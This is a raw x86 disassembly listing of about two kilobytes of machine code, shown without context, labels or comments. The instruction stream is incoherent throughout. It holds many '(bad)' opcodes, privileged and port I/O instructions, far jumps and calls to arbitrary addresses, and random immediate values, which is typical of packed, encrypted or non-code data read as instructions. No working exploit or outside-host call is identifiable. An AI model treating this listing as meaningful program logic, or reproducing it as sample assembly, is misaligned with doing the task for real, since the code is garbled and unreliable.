  40e7fd:	push   cs
  40e7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ff:	fsub   QWORD PTR [edi]
  40e801:	pop    ebp
  40e802:	push   ebx
  40e803:	sub    bh,BYTE PTR [eax-0x14c66fd3]
  40e809:	aas    
  40e80a:	mov    dh,0x6c
  40e80c:	mov    dl,0x83
  40e80e:	mov    edi,0xdea286fd
  40e813:	dec    esi
  40e814:	jbe    0x40e80a
  40e816:	ficom  DWORD PTR [esi]
  40e818:	and    DWORD PTR [edi+esi*1],ebp
  40e81b:	xchg   ebp,eax
  40e81c:	jg     0x40e82f
  40e81e:	leave  
  40e81f:	dec    edi
  40e820:	into   
  40e821:	das    
  40e822:	add    eax,0x166997db
  40e827:	sti    
  40e828:	pop    eax
  40e829:	iret   
  40e82a:	aad    0xd4
  40e82c:	aaa    
  40e82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e82e:	push   es
  40e82f:	xchg   edi,eax
  40e830:	cmc    
  40e831:	jge    0x40e7bf
  40e833:	ins    BYTE PTR es:[edi],dx
  40e834:	cwde   
  40e835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e836:	ins    BYTE PTR es:[edi],dx
  40e837:	pop    eax
  40e838:	push   es
  40e839:	cmp    DWORD PTR [edi],ebp
  40e83b:	cmp    esi,DWORD PTR [edx+0x2b82bf52]
  40e841:	(bad)  
  40e842:	icebp  
  40e843:	mov    cs,WORD PTR [edx-0x27]
  40e846:	lods   al,BYTE PTR ds:[esi]
  40e847:	psubq  mm7,QWORD PTR [ecx+eax*2+0x453c0ec]
  40e84f:	add    DWORD PTR [ecx-0x5f89d0fc],edx
  40e855:	ss enter 0x9283,0x96
  40e85a:	push   es
  40e85b:	imul   ebx,DWORD PTR [edx+eiz*1-0x41b0a82c],0x8f88ca24
  40e866:	pop    DWORD PTR [eax]
  40e868:	pushf  
  40e869:	jg     0x40e7fd
  40e86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e86d:	in     eax,dx
  40e86e:	jb     0x40e8e8
  40e870:	stos   BYTE PTR es:[edi],al
  40e871:	fs pop ss
  40e873:	stos   BYTE PTR es:[edi],al
  40e874:	push   ebp
  40e875:	sub    bl,BYTE PTR [esi+0x3f]
  40e878:	mov    eax,ds:0x9e7474a1
  40e87d:	repz rcl DWORD PTR [edx+eax*1-0x426aa123],0x22
  40e886:	cmp    esi,esp
  40e888:	and    DWORD PTR [esi+0x75],esi
  40e88b:	bound  ebp,QWORD PTR [esi+0x74e9768d]
  40e891:	xlat   BYTE PTR ds:[ebx]
  40e892:	sti    
  40e893:	cmp    al,0x69
  40e895:	and    DWORD PTR [eax-0x7274dd05],ecx
  40e89b:	int3   
  40e89c:	jp     0x40e917
  40e89e:	outs   dx,BYTE PTR ds:[esi]
  40e89f:	fucom  st(4)
  40e8a1:	mov    edx,0x157f5371
  40e8a6:	test   DWORD PTR [edi+0x57c7ab2c],edi
  40e8ac:	cmc    
  40e8ad:	pop    edi
  40e8ae:	shl    BYTE PTR [eax],0x9e
  40e8b1:	xor    eax,0x1a9b3d9b
  40e8b6:	outs   dx,DWORD PTR ds:[esi]
  40e8b7:	les    edx,FWORD PTR [ebx-0x53]
  40e8ba:	scas   eax,DWORD PTR es:[edi]
  40e8bb:	loopne 0x40e8af
  40e8bd:	into   
  40e8be:	std    
  40e8bf:	or     bl,al
  40e8c1:	push   ecx
  40e8c2:	les    edx,FWORD PTR [edi*2-0x702e666c]
  40e8c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ca:	mov    edi,0x44bdb9a8
  40e8cf:	mov    DWORD PTR [eax+0x47],ebp
  40e8d2:	jmp    0x40e92d
  40e8d4:	pop    eax
  40e8d5:	not    DWORD PTR [edx+eiz*1+0x31]
  40e8d9:	fld    TBYTE PTR [esp+eax*4+0x29]
  40e8dd:	enter  0xea04,0x3b
  40e8e1:	lock xor eax,0xf7156d85
  40e8e7:	adc    BYTE PTR [edx],ah
  40e8e9:	popa   
  40e8ea:	cs pop ecx
  40e8ec:	icebp  
  40e8ed:	add    al,0xef
  40e8ef:	cmc    
  40e8f0:	repz mov al,BYTE PTR gs:[ecx-0x64]
  40e8f5:	mov    dh,0xea
  40e8f7:	mov    bl,0x28
  40e8f9:	jae    0x40e930
  40e8fb:	xor    eax,0xd78b94ec
  40e900:	mov    cl,0x42
  40e902:	pop    ecx
  40e903:	mov    eax,0x1e626840
  40e908:	pop    es
  40e909:	mov    cl,0xbd
  40e90b:	cmp    DWORD PTR [edx+0x51daae7c],0xffffff88
  40e912:	rcr    BYTE PTR [ecx+0x24],cl
  40e915:	add    DWORD PTR [ebp+0x47],esp
  40e918:	ja     0x40e982
  40e91a:	adc    BYTE PTR ds:[esi+edi*4+0x78fb2202],ch
  40e922:	sub    BYTE PTR [esi-0x7859012b],al
  40e928:	adc    ch,BYTE PTR [edx-0x67]
  40e92b:	ret    0xfbdc
  40e92e:	(bad)  
  40e92f:	bound  edx,QWORD PTR [edx+eiz*2]
  40e932:	lahf   
  40e933:	jae    0x40e8b5
  40e935:	xor    edx,DWORD PTR [esi+ecx*2]
  40e938:	test   eax,0xc2ec6c13
  40e93d:	inc    ecx
  40e93e:	inc    ebp
  40e93f:	repnz loopne 0x40e97e
  40e942:	cmp    BYTE PTR [edi-0x51],dl
  40e945:	add    al,0xdb
  40e947:	ret    
  40e948:	stc    
  40e949:	ror    DWORD PTR [ebp+0x7faf93f3],cl
  40e94f:	idiv   BYTE PTR [ecx-0x5246303]
  40e955:	push   0x744dee59
  40e95a:	jbe    0x40e964
  40e95c:	push   eax
  40e95d:	pop    eax
  40e95e:	ret    
  40e95f:	cdq    
  40e960:	pop    ebp
  40e961:	jb     0x40e909
  40e963:	fcomp  QWORD PTR [esi-0x422e77ee]
  40e969:	adc    eax,0x1bb83883
  40e96e:	pop    ds
  40e96f:	xlat   BYTE PTR ds:[ebx]
  40e970:	mov    bl,0xf9
  40e972:	rcl    BYTE PTR [esi],cl
  40e974:	sbb    al,0xab
  40e976:	stos   BYTE PTR es:[edi],al
  40e977:	popf   
  40e978:	inc    ebx
  40e979:	mov    eax,ds:0x3fb432b6
  40e97e:	imul   ebp,DWORD PTR [esi],0xc
  40e981:	xor    dl,BYTE PTR [ecx+0x5a34d44c]
  40e987:	mov    bl,0xe9
  40e989:	imul   ebp,DWORD PTR [ebx+0x4e6d0bd6],0x4b
  40e990:	cmp    eax,0x261a14f6
  40e995:	outs   dx,BYTE PTR ds:[esi]
  40e996:	or     eax,0x75f97d55
  40e99b:	jmp    0x353a9751
  40e9a0:	cwde   
  40e9a1:	mov    esi,0xace01282
  40e9a6:	cmp    BYTE PTR [ecx+0x70442f8a],ch
  40e9ac:	cwde   
  40e9ad:	or     eax,0xa58a9125
  40e9b2:	mov    ch,BYTE PTR [esi+0xadd0ee0]
  40e9b8:	nop
  40e9b9:	xchg   ecx,eax
  40e9ba:	and    al,0xb0
  40e9bc:	xor    ebx,DWORD PTR [esi+0x46]
  40e9bf:	hlt    
  40e9c0:	in     al,dx
  40e9c1:	ins    DWORD PTR es:[edi],dx
  40e9c2:	pop    ebx
  40e9c3:	hlt    
  40e9c4:	(bad)  
  40e9c6:	dec    eax
  40e9c7:	cld    
  40e9c8:	mov    DWORD PTR [ebx],ebp
  40e9ca:	add    al,0x71
  40e9cc:	mov    edi,0x4a4f8e20
  40e9d1:	int3   
  40e9d2:	or     bh,BYTE PTR ds:0x76d8738d
  40e9d8:	(bad)  
  40e9d9:	or     ecx,ebp
  40e9db:	jmp    0x4824:0x5c6b8fa7
  40e9e2:	jecxz  0x40e971
  40e9e4:	pop    es
  40e9e5:	xor    cl,BYTE PTR [edi+0x254bf665]
  40e9eb:	fwait
  40e9ec:	inc    eax
  40e9ed:	dec    ebx
  40e9ee:	sbb    DWORD PTR ds:0xd5fcfda8,ebx
  40e9f4:	push   ebx
  40e9f5:	inc    ebx
  40e9f6:	aas    
  40e9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9f8:	inc    eax
  40e9f9:	sub    DWORD PTR [ebp+0x1f6b503a],eax
  40e9ff:	fdivp  st(1),st
  40ea01:	sub    BYTE PTR cs:[eax],bh
  40ea04:	mov    edx,0xdd744501
  40ea09:	mov    ch,BYTE PTR [ebx+0x546d9274]
  40ea0f:	mov    ah,0xfc
  40ea11:	(bad)  
  40ea12:	mov    ecx,0x75b20753
  40ea17:	add    eax,0xe5237f24
  40ea1c:	sar    DWORD PTR [ecx+0x4e],cl
  40ea1f:	add    al,0x6e
  40ea21:	mov    edi,0x5123cebf
  40ea26:	pop    ebx
  40ea27:	sub    eax,DWORD PTR ds:[edi-0x13]
  40ea2b:	mov    ch,0x8d
  40ea2d:	push   0x12948331
  40ea32:	cmp    bl,BYTE PTR [esi]
  40ea34:	mov    bl,0x2c
  40ea36:	mov    ecx,0x6329cf99
  40ea3b:	in     al,dx
  40ea3c:	cli    
  40ea3d:	inc    edx
  40ea3e:	imul   edi,DWORD PTR [ecx],0xffffffa8
  40ea41:	mov    ah,0x10
  40ea43:	hlt    
  40ea44:	call   0xf95d:0xa733d0df
  40ea4b:	idiv   BYTE PTR [edi]
  40ea4d:	(bad)  
  40ea4e:	das    
  40ea4f:	in     al,dx
  40ea50:	les    ecx,FWORD PTR [eax-0x52]
  40ea53:	inc    ecx
  40ea54:	neg    DWORD PTR [esi-0x57]
  40ea57:	dec    esi
  40ea58:	imul   BYTE PTR [edx]
  40ea5a:	loop   0x40eadb
  40ea5c:	cmp    ch,bl
  40ea5e:	xor    DWORD PTR es:[ebp-0x13],esi
  40ea62:	retf   
  40ea63:	mov    eax,ds:0x2ad7e862
  40ea68:	aam    0xb7
  40ea6a:	fdiv   DWORD PTR [eax-0x550054c4]
  40ea70:	mov    ebp,0x39c3a03e
  40ea75:	jns    0x40ea1f
  40ea77:	or     eax,0xfa4ce70b
  40ea7c:	inc    edi
  40ea7d:	push   eax
  40ea7e:	jae    0x40ea5e
  40ea80:	mov    esp,0x165fe651
  40ea85:	xor    eax,0x3e0be5f8
  40ea8a:	jns    0x40ea20
  40ea8c:	scas   eax,DWORD PTR es:[edi]
  40ea8d:	in     al,0x32
  40ea8f:	inc    esp
  40ea90:	pop    esi
  40ea91:	pop    edi
  40ea92:	ret    
  40ea93:	mov    cl,0x5f
  40ea95:	sahf   
  40ea96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea97:	xchg   edi,eax
  40ea98:	lea    edx,[eax-0x321348d2]
  40ea9e:	nop
  40ea9f:	jns    0x40eb19
  40eaa1:	xchg   edx,eax
  40eaa2:	or     al,0x4b
  40eaa4:	xchg   ebp,eax
  40eaa5:	jp     0x40ea85
  40eaa7:	or     eax,0x2c3300f
  40eaac:	mov    edi,0xa4649001
  40eab1:	in     eax,dx
  40eab2:	pop    esp
  40eab3:	es fdivr st(3),st
  40eab6:	fstp   QWORD PTR [ebp+0x9]
  40eab9:	xor    ebx,DWORD PTR [edi-0x6d]
  40eabc:	stc    
  40eabd:	ret    0x64
  40eac0:	and    al,0x72
  40eac2:	xchg   ebp,eax
  40eac3:	icebp  
  40eac4:	sub    BYTE PTR [edi-0x28],al
  40eac7:	sbb    DWORD PTR [eax-0x262dec27],0xea3e2e8e
  40ead1:	add    DWORD PTR [esp+ebx*8+0x2b87c5f],0x14
  40ead9:	lock pushf 
  40eadb:	mov    al,0xfd
  40eadd:	lock xor eax,0xcd71c0b
  40eae3:	mov    ds:0x681510d8,al
  40eae8:	pushf  
  40eae9:	popf   
  40eaea:	ja     0x40ea70
  40eaec:	sub    BYTE PTR [esi+0x123c54b2],dl
  40eaf2:	pop    ds
  40eaf3:	xor    eax,0x851a09ee
  40eaf8:	(bad)  
  40eaf9:	mov    al,0x49
  40eafb:	lds    eax,FWORD PTR [ebp-0x21bc492f]
  40eb01:	jbe    0x40eb77
  40eb03:	(bad)  
  40eb04:	out    0x5f,al
  40eb06:	out    dx,al
  40eb07:	(bad)  
  40eb08:	cmp    eax,DWORD PTR [eax-0x40]
  40eb0b:	sub    al,0xf5
  40eb0d:	ins    BYTE PTR es:[edi],dx
  40eb0e:	(bad)  
  40eb0f:	in     al,dx
  40eb10:	shl    BYTE PTR [ecx-0x7],cl
  40eb13:	adc    DWORD PTR [edi+0x118b17a2],ecx
  40eb19:	pop    ebp
  40eb1a:	jmp    0x9baa3e94
  40eb1f:	fidivr DWORD PTR [edx+0x79]
  40eb22:	dec    esp
  40eb23:	ret    0xa22b
  40eb26:	int3   
  40eb27:	jmp    DWORD PTR [edi+0x2b]
  40eb2a:	xchg   edx,eax
  40eb2b:	adc    DWORD PTR [eax-0x23],edx
  40eb2e:	pop    esp
  40eb2f:	fistp  QWORD PTR [ebx]
  40eb31:	rcl    BYTE PTR [ebx-0x6e93b12a],1
  40eb37:	adc    BYTE PTR [ebp+esi*1+0x2cead620],dh
  40eb3e:	leave  
  40eb3f:	dec    ebp
  40eb40:	mov    dl,0x76
  40eb42:	mov    esp,0x4a7bc048
  40eb47:	pop    ebx
  40eb48:	jae    0x40eb8f
  40eb4a:	inc    esi
  40eb4b:	pop    ds
  40eb4c:	cmp    al,0xf
  40eb4e:	adc    cl,BYTE PTR [ebp-0x2328bc12]
  40eb54:	lahf   
  40eb55:	xor    ebp,ecx
  40eb57:	test   al,0xb3
  40eb59:	loope  0x40eae8
  40eb5b:	jg     0x40eb99
  40eb5d:	pop    ss
  40eb5e:	pop    esp
  40eb5f:	inc    ecx
  40eb60:	pop    esi
  40eb61:	pusha  
  40eb62:	add    ebx,DWORD PTR [ecx-0x30]
  40eb65:	push   cs
  40eb66:	mov    edi,0x6117f3e4
  40eb6b:	sub    al,0x53
  40eb6d:	and    cl,ch
  40eb6f:	nop
  40eb70:	sbb    edi,DWORD PTR [ecx+0x21dc5277]
  40eb76:	mov    bl,0xb3
  40eb78:	jae    0x40eb34
  40eb7a:	or     eax,0x69595db0
  40eb7f:	lods   eax,DWORD PTR ds:[esi]
  40eb80:	mov    al,0xdb
  40eb82:	neg    DWORD PTR [bx+0x248a]
  40eb87:	xor    DWORD PTR [ebp+0x7a],ebp
  40eb8a:	add    eax,0x3cb639bb
  40eb8f:	ss pop ds
  40eb91:	add    ebx,ebx
  40eb93:	ja     0x40eb45
  40eb95:	ds xor al,0x9a
  40eb98:	cdq    
  40eb99:	shr    BYTE PTR [edi],cl
  40eb9b:	cmp    ecx,DWORD PTR [ecx+0x1293e120]
  40eba1:	pusha  
  40eba2:	add    cl,BYTE PTR [ebx+0x38]
  40eba5:	arpl   bx,dx
  40eba7:	push   ecx
  40eba8:	les    ebx,FWORD PTR ds:0xef0b0edc
  40ebae:	gs pop ds
  40ebb0:	imul   ebp,DWORD PTR [ebp-0x3a],0x4302074d
  40ebb7:	adc    bh,BYTE PTR [edx+0x5a40bb09]
  40ebbd:	pop    esi
  40ebbe:	sub    BYTE PTR [ecx-0x1f],cl
  40ebc1:	clc    
  40ebc2:	ffree  st(7)
  40ebc4:	mov    esp,0x67e6f5af
  40ebc9:	sbb    ebx,0xe
  40ebcc:	adc    al,0xb9
  40ebce:	jg     0x40ebc7
  40ebd0:	sub    eax,ebp
  40ebd2:	icebp  
  40ebd3:	fadd   DWORD PTR [eax+0x5b037f2a]
  40ebd9:	pop    eax
  40ebda:	push   ecx
  40ebdb:	(bad)  
  40ebdc:	dec    esi
  40ebdd:	sub    BYTE PTR ds:0xc540d9cb,0x53
  40ebe4:	mov    ebp,0x22427b32
  40ebe9:	mov    edx,0x1b723349
  40ebee:	iret   
  40ebef:	hlt    
  40ebf0:	adc    al,0x53
  40ebf2:	jne    0x40ec4d
  40ebf4:	xchg   edi,esi
  40ebf6:	xor    BYTE PTR ds:0x40ecd40e,dh
  40ebfc:	add    BYTE PTR [esi],dh
  40ebfe:	clc    
  40ebff:	xchg   esi,eax
  40ec00:	fnstcw WORD PTR [edx+ebx*4+0x745b59cf]
  40ec07:	div    DWORD PTR [esi+0x3fed339d]
  40ec0d:	mov    al,0x64
  40ec0f:	jmp    0x64ef9e7
  40ec14:	dec    ecx
  40ec15:	loope  0x40ec24
  40ec17:	ret    
  40ec18:	mov    BYTE PTR ds:0x2d72e7d6,cl
  40ec1e:	jne    0x40ec1a
  40ec20:	cmp    eax,0x70e35fd0
  40ec25:	adc    cl,BYTE PTR [edi-0x4]
  40ec28:	(bad)
  40ec2b:	fisubr WORD PTR ds:0xdbc9e3ef
  40ec31:	xor    al,0xc0
  40ec33:	mov    eax,ds:0x15f78007
  40ec38:	adc    DWORD PTR [edx+0x3d],edi
  40ec3b:	ret    0xe808
  40ec3e:	add    BYTE PTR [ebp+edx*8-0x72],0x93
  40ec43:	cdq    
  40ec44:	ins    BYTE PTR es:[edi],dx
  40ec45:	or     DWORD PTR [ebp-0x6ac42bc7],edx
  40ec4b:	pop    esi
  40ec4c:	in     eax,0xa1
  40ec4e:	mov    ch,0x7d
  40ec50:	repz das 
  40ec52:	or     cl,ch
  40ec54:	inc    esi
  40ec55:	mov    WORD PTR [ecx-0x7d25ffc9],?
  40ec5b:	jae    0x40ecbb
  40ec5d:	xchg   esi,eax
  40ec5e:	adc    ebp,DWORD PTR [ecx]
  40ec60:	sub    BYTE PTR [edi],ah
  40ec62:	mov    esp,0x51cba9e1
  40ec67:	cmp    al,BYTE PTR [edi+0x13]
  40ec6a:	les    eax,FWORD PTR [edx]
  40ec6c:	mov    edi,0x67a1815e
  40ec72:	or     al,0x4
  40ec74:	and    ecx,eax
  40ec76:	mov    al,0x84
  40ec78:	adc    al,0xf2
  40ec7a:	xchg   DWORD PTR [eax],esp
  40ec7c:	scas   eax,DWORD PTR es:[edi]
  40ec7d:	xchg   esi,eax
  40ec7e:	bound  esi,QWORD PTR [edi+0x7e]
  40ec81:	fwait
  40ec82:	push   eax
  40ec83:	add    eax,0xdbfd4e20
  40ec88:	sub    BYTE PTR [esi+0xc3a6e71],bl
  40ec8e:	xchg   DWORD PTR [ecx],ebp
  40ec90:	push   ecx
  40ec91:	pop    eax
  40ec92:	pop    esi
  40ec93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec94:	push   ds
  40ec95:	jo     0x40ecdc
  40ec97:	jl     0x40ec37
  40ec99:	fs pop edx
  40ec9b:	cs jbe 0x40ec4c
  40ec9e:	aad    0x55
  40eca0:	push   DWORD PTR ds:[edi]
  40eca3:	sti    
  40eca4:	retf   
  40eca5:	sub    esp,0x19
  40eca8:	jns    0x40ec49
  40ecaa:	fistp  DWORD PTR [esi-0x5650286b]
  40ecb0:	(bad)  
  40ecb1:	mov    edi,0x25a74382
  40ecb6:	and    ch,BYTE PTR [ebp+0x36c538bb]
  40ecbc:	sbb    al,0x83
  40ecbe:	retf   
  40ecbf:	enter  0xf79e,0xad
  40ecc3:	add    BYTE PTR [esi-0x69e62b99],dh
  40ecc9:	xchg   edx,eax
  40ecca:	inc    edx
  40eccb:	inc    esp
  40eccc:	jae    0x40ec89
  40ecce:	std    
  40eccf:	out    dx,eax
  40ecd0:	into   
  40ecd1:	mov    ds,ebp
  40ecd3:	sti    
  40ecd4:	mov    ecx,0x337b5cb1
  40ecd9:	data16 cs idiv cl
  40ecdd:	or     eax,0xffd29bc
  40ece2:	jg     0x40ecd7
  40ece4:	ret    0xfc49
  40ece7:	pop    ecx
  40ece8:	imul   ebp,ebx,0xffffffc3
  40eceb:	push   edx
  40ecec:	mov    cl,0x3d
  40ecee:	xor    ch,bl
  40ecf0:	or     esp,DWORD PTR [edx-0x51]
  40ecf3:	pop    edi
  40ecf4:	push   ebx
  40ecf5:	mov    es,WORD PTR [esi-0x28da669d]
  40ecfb:	or     al,0xda
  40ecfd:	(bad)  
  40ecfe:	call   0xbaa55c5a
  40ed03:	ins    DWORD PTR es:[edi],dx
  40ed04:	addr16 jmp 0x44d679f5
  40ed0a:	or     BYTE PTR [esi-0x4a],dl
  40ed0d:	(bad)  
  40ed0e:	icebp  
  40ed0f:	sub    DWORD PTR ds:0x46c2affc,esi
  40ed15:	mov    ds:0x4ed9ce50,eax
  40ed1a:	mov    ah,0x5f
  40ed1c:	mov    BYTE PTR [ecx+0x54a851ef],bl
  40ed22:	jo     0x40ed97
  40ed24:	stos   BYTE PTR es:[edi],al
  40ed25:	stos   BYTE PTR es:[edi],al
  40ed26:	sub    dh,dh
  40ed28:	cmp    BYTE PTR [edi],ah
  40ed2a:	jbe    0x40ed4a
  40ed2c:	xchg   edi,eax
  40ed2d:	pop    ebp
  40ed2e:	dec    esi
  40ed2f:	xchg   BYTE PTR [ebp+0x14dd649d],al
  40ed35:	loop   0x40ece1
  40ed37:	shr    ecx,1
  40ed39:	ins    DWORD PTR es:[edi],dx
  40ed3a:	jge    0x40ed0c
  40ed3c:	mov    WORD PTR [edi-0x261b1a61],ss
  40ed42:	stos   DWORD PTR es:[edi],eax
  40ed43:	cli    
  40ed44:	mov    ah,0x66
  40ed46:	dec    ebx
  40ed47:	fst    DWORD PTR [edx+0x761fdae5]
  40ed4d:	sbb    BYTE PTR [ecx+0x5],0x27
  40ed51:	mov    bl,0x5a
  40ed53:	es pop ebx
  40ed55:	jle    0x40edab
  40ed57:	add    al,0xe8
  40ed59:	pop    ebp
  40ed5a:	bound  ebp,QWORD PTR [esp+eax*8]
  40ed5d:	call   0xaa34dabb
  40ed62:	cdq    
  40ed63:	and    dl,al
  40ed65:	loopne 0x40ed9a
  40ed67:	mov    edx,0x9edf8a6f
  40ed6c:	leave  
  40ed6d:	es xchg edx,eax
  40ed6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed70:	(bad)  
  40ed71:	out    dx,eax
  40ed72:	mov    esp,0x2c9b6978
  40ed77:	mov    esi,0x9de16060
  40ed7c:	pop    es
  40ed7d:	retf   
  40ed7e:	lds    eax,FWORD PTR [eax]
  40ed80:	cmc    
  40ed81:	sub    eax,0x2e0f09c1
  40ed86:	jbe    0x40edf6
  40ed88:	sti    
  40ed89:	out    dx,al
  40ed8a:	dec    eax
  40ed8b:	push   ds
  40ed8c:	xchg   esi,eax
  40ed8d:	push   DWORD PTR [esi]
  40ed8f:	es fwait
  40ed91:	mov    ebx,0x5e2383ba
  40ed96:	cmp    eax,0x2d8c8f30
  40ed9b:	loopne 0x40edf2
  40ed9d:	std    
  40ed9e:	mov    ecx,0x4684b587
  40eda3:	sbb    al,0xc4
  40eda5:	in     al,dx
  40eda6:	push   edx
  40eda7:	ret    
  40eda8:	fistp  DWORD PTR [eax-0x7c]
  40edab:	(bad)  
  40edac:	push   ds
  40edad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edae:	je     0x40edbc
  40edb0:	div    BYTE PTR [ebp+0x1487724f]
  40edb6:	mov    edi,0x55b7389f
  40edbb:	ss xchg esi,eax
  40edbd:	stos   DWORD PTR es:[edi],eax
  40edbe:	sbb    BYTE PTR [ebx],cl
  40edc0:	stos   BYTE PTR es:[edi],al
  40edc1:	nop
  40edc2:	mov    DWORD PTR [esi],esi
  40edc4:	xchg   si,si
  40edc7:	push   edx
  40edc8:	call   0xa941:0xf5aa5c24
  40edcf:	(bad)  
  40edd1:	je     0x40ee42
  40edd3:	sub    ch,BYTE PTR [edx*1-0x1b6a9ccc]
  40edda:	pop    ecx
  40eddb:	mov    BYTE PTR [ebp+0x53],ch
  40edde:	cmp    DWORD PTR [edx-0x6f],0x7b
  40ede2:	dec    ebp
  40ede3:	(bad)  
  40ede4:	fisub  DWORD PTR [ecx+0x61]
  40ede7:	cmp    eax,0xda4e11ad
  40edec:	add    eax,ebp
  40edee:	mov    edi,DWORD PTR [eax]
  40edf0:	dec    esp
  40edf1:	retf   0xad35
  40edf4:	arpl   WORD PTR [edx+0x65ff9dad],si
  40edfa:	(bad)  
  40edfb:	call   DWORD PTR [ecx+0x6]
  40edfe:	mov    DWORD PTR [edi+edx*2],ebp
  40ee01:	xor    DWORD PTR fs:[edx+0x749f83b7],0xffffffb0
  40ee09:	jecxz  0x40ee2d
  40ee0b:	vmread DWORD PTR [edi+0x19],esp
  40ee0f:	add    BYTE PTR [eax],0x2b
  40ee12:	pop    esi
  40ee13:	outs   dx,BYTE PTR ds:[esi]
  40ee14:	pop    esp
  40ee15:	nop
  40ee16:	push   0x4c360806
  40ee1b:	pushf  
  40ee1c:	jp     0x40edd9
  40ee1e:	jbe    0x40ee40
  40ee20:	jmp    0x40ee10
  40ee22:	std    
  40ee23:	fs jmpw 0x5b8f
  40ee28:	pop    esi
  40ee29:	adc    eax,0x91ab891b
  40ee2e:	sbb    esi,edi
  40ee30:	lods   al,BYTE PTR ds:[esi]
  40ee31:	xlat   BYTE PTR ds:[ebx]
  40ee32:	loopne 0x40ee42
  40ee34:	pusha  
  40ee35:	jg     0x40ede8
  40ee37:	jae    0x40ee76
  40ee39:	push   es
  40ee3a:	sub    al,0xac
  40ee3c:	test   eax,0xda12d353
  40ee41:	vunpckhps ymm1,ymm2,YMMWORD PTR [ebx+0x34]
  40ee46:	js     0x40ee6e
  40ee48:	cs ja  0x40ee34
  40ee4b:	and    al,0xd4
  40ee4d:	aad    0x5f
  40ee4f:	out    dx,al
  40ee50:	push   edx
  40ee51:	stos   BYTE PTR es:[edi],al
  40ee52:	test   DWORD PTR [edi+ebp*8+0x4a58db7d],ebp
  40ee59:	dec    edx
  40ee5a:	iret   
  40ee5b:	std    
  40ee5c:	or     bl,BYTE PTR [esi+0x12293a14]
  40ee62:	xor    DWORD PTR [ecx+ecx*4+0x2a],ebx
  40ee66:	ds in  al,0xdb
  40ee69:	ds ja  0x40ee5f
  40ee6c:	xchg   esp,eax
  40ee6d:	(bad)  
  40ee6e:	mov    ebp,0x85c82e53
  40ee73:	test   BYTE PTR [ebp-0x5965ec1f],ah
  40ee79:	mov    edi,0xb47caab5
  40ee7e:	lds    ebx,FWORD PTR [eax-0x26b053d7]
  40ee84:	mul    al
  40ee86:	sub    al,0x44
  40ee88:	call   0x7e9:0xb1f0fb62
  40ee8f:	retf   0x9233
  40ee92:	cmp    DWORD PTR [esi],0xffffffa2
  40ee95:	out    0x50,eax
  40ee97:	test   al,0x87
  40ee99:	xchg   ebp,ecx
  40ee9b:	aaa    
  40ee9c:	adc    DWORD PTR [edi+edx*4-0x80],esi
  40eea0:	push   ebx
  40eea1:	shr    BYTE PTR [eax],cl
  40eea3:	pop    ebx
  40eea4:	cmp    BYTE PTR [ecx],ch
  40eea6:	fcomi  st,st(3)
  40eea8:	xchg   esi,eax
  40eea9:	in     eax,dx
  40eeaa:	jnp    0x40eeb2
  40eeac:	cmc    
  40eead:	jle    0x40eeab
  40eeaf:	sub    al,0x55
  40eeb1:	(bad)  
  40eeb2:	sub    ebp,esp
  40eeb4:	xor    ebp,DWORD PTR fs:[edx]
  40eeb7:	sbb    esi,DWORD PTR [ebx+0x167d53b7]
  40eebd:	mov    WORD PTR [eax],ss
  40eebf:	fcomi  st,st(5)
  40eec1:	jns    0x40ef16
  40eec3:	mov    gs,WORD PTR [eax-0x704c52ba]
  40eec9:	shl    BYTE PTR [eax-0x5287945a],0x76
  40eed0:	shl    DWORD PTR [ebp-0xa93ed20],cl
  40eed6:	xchg   DWORD PTR [eax+eiz*4],esi
  40eed9:	ja     0x40ee5e
  40eedb:	pop    es
  40eedc:	push   es
  40eedd:	xor    cl,BYTE PTR [edx+eax*1]
  40eee0:	popf   
  40eee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eee2:	rcl    BYTE PTR [ecx+0x3],1
  40eee5:	out    dx,al
  40eee6:	dec    edx
  40eee7:	popf   
  40eee8:	(bad)  
  40eeea:	cmp    DWORD PTR gs:[eax+0x1f],0xf6e45a98
  40eef2:	shl    BYTE PTR [ebx-0x76],cl
  40eef5:	jp     0x40eecb
  40eef7:	sbb    DWORD PTR [esi+edi*4],0x73e261f5
  40eefe:	mov    al,0x8a
  40ef00:	xor    BYTE PTR [eax+0x28539c76],dl
  40ef06:	xchg   edx,eax
  40ef07:	retf   
  40ef08:	dec    ebx
  40ef09:	mov    cl,0x37
  40ef0b:	pop    edi
  40ef0c:	popf   
  40ef0d:	loopne 0x40ef82
  40ef0f:	repz push ebx
  40ef11:	mov    ah,0x9
  40ef13:	sti    
  40ef14:	adc    DWORD PTR [eax+0x6c5a3416],edi
  40ef1a:	sbb    bh,BYTE PTR [ebx]
  40ef1c:	add    edi,DWORD PTR cs:[edi]
  40ef1f:	ret    
  40ef20:	xor    al,0xe3
  40ef22:	(bad)  
  40ef23:	jl     0x40ef35
  40ef25:	or     al,0xa7
  40ef27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef28:	mov    edx,0x336269c8
  40ef2d:	test   eax,0x96349624
  40ef32:	dec    eax
  40ef33:	test   al,0x65
  40ef35:	sahf   
  40ef36:	mov    edi,0xb9311cfb
  40ef3b:	int    0xcf
  40ef3d:	pop    ebp
  40ef3e:	fld    QWORD PTR [edx+0x21ddbb62]
  40ef44:	add    eax,0x6fd09eb3
  40ef49:	xchg   ecx,eax
  40ef4a:	push   esp
  40ef4b:	sub    eax,0x51dffee7
  40ef51:	push   es
  40ef52:	sbb    al,0xee
  40ef54:	retf   0x9a7b
  40ef57:	fsub   st,st(7)
  40ef59:	je     0x40ef24
  40ef5b:	mov    bl,0xb0
  40ef5d:	retf   0xfe50
  40ef60:	sub    DWORD PTR [esi+0x46c4ddbb],esi
  40ef66:	outs   dx,BYTE PTR ds:[esi]
  40ef67:	mov    ecx,0xc026fb21
  40ef6c:	add    eax,0xaadc2d59
  40ef71:	push   ebx
  40ef72:	sub    eax,0x8da9549f
  40ef77:	jne    0x40ef53
  40ef79:	test   eax,0x760d06ba
